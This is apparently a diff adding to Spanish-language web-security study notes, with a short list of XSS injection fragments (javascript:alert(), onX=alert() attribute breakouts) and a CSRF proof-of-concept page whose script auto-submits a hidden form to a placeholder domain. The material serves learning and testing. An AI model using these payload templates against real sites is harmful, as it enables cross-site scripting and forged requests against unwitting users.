@@ -43,7 +43,31 @@ Interactua solo en el cliente, y es la estructura que vemos en el navegador. Apa
 https://sudo.co.il/xss/
 
 
+###
+javascript:alert()	           '
+onX="alert()"	                 "
+onX=alert()                    ;
+
+
 ## Contituido un HTML ##
 
 <script src="http://app1.com/1.js"> </script>
 <input type="passwd" value="{TEST}">
+
+
+
+
+### CSRF
+<html>
+  <body>
+    <form action="http://dominio/recurso" method="GET/POST">
+      <input type="hidden" name="appsec" value="appsec" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
